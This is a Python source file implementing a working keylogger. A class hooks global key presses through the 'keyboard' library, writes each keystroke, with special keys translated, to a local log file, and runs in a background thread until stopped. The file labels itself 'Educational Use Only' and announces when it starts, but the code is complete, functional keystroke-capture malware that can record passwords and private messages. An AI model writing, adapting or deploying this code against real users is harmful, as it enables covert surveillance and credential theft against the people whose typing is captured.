import keyboard
import time
from datetime import datetime
import threading

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.is_running = False

    def on_key_press(self, event):
        """Log key presses to a file."""
        with open(self.log_file, "a") as f:
            key = event.name
            if len(key) > 1:  # Handle special keys (e.g., 'space', 'enter')
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "\n"
                elif key == "decimal":
                    key = "."
                else:
                    key = f"[{key.upper()}]"
            f.write(key)

    def start(self):
        """Start the keylogger."""
        self.is_running = True
        print(f"[*] Keylogger started. Logging to '{self.log_file}'")
        keyboard.on_press(self.on_key_press)

        # Keep the script running
        while self.is_running:
            time.sleep(1)

    def stop(self):
        """Stop the keylogger."""
        self.is_running = False
        keyboard.unhook_all()
        print("[!] Keylogger stopped.")

def main():
    print("=== Basic Keylogger (Educational Use Only) ===")
    log_file = input("Enter log file name (default: keylog.txt): ") or "keylog.txt"

    keylogger = Keylogger(log_file)
    try:
        # Start keylogger in a background thread
        threading.Thread(target=keylogger.start, daemon=True).start()
        input("[Press ENTER to stop logging]\n")
    except KeyboardInterrupt:
        pass
    finally:
        keylogger.stop()

if __name__ == "__main__":
    main()